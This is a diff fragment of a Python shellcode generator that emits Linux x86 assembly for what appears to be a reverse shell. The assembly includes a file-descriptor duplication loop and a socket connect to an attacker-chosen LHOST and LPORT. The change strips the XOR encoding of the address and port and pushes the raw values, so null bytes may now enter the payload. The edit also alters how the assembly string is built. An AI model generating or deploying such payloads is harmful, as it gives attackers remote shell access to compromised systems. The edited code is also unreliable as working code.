@@ -97,23 +97,13 @@ class Shellcode():
             int 0x80
             dec ecx                                ; Decrement the loop counter
             jns loop
-        """
-
-        xor_port_fam = hex(int(f"{sin_port}{sin_family}", 16) ^ 0xFFFFFFFF)
-        xor_sin_addr = hex(int(f"{sin_addr}", 16) ^ 0xFFFFFFFF)
-
-        source_code += f"""
+        
         connect:
             ; int syscall(SYS_socketcall,      // EAX => socketcall syscall
             ;             int call,            // EBX => SYS_CONNECT
             ;             unsigned long *args) // ECX => *(sockfd, (struct sockaddr*), sizeof((struct sockaddr *))
-            mov eax, 0xffffffff
-            xor eax, {xor_sin_addr}
-            push eax                               ; client.sin_addr.s_addr = inet_addr(LHOST)
-
-            mov eax, 0xffffffff
-            xor eax, {xor_port_fam}
-            push eax                               ; client.sin_port = htons(LPORT)
+            push {sin_addr}                        ; client.sin_addr.s_addr = inet_addr(LHOST)
+            push 0x{sin_port}{sin_family}          ; client.sin_port = htons(LPORT)
                                                    ; client.sin_family = AF_INET
 
             mov ecx, esp                           ; Store the pointer to the sockaddr struct into ECX
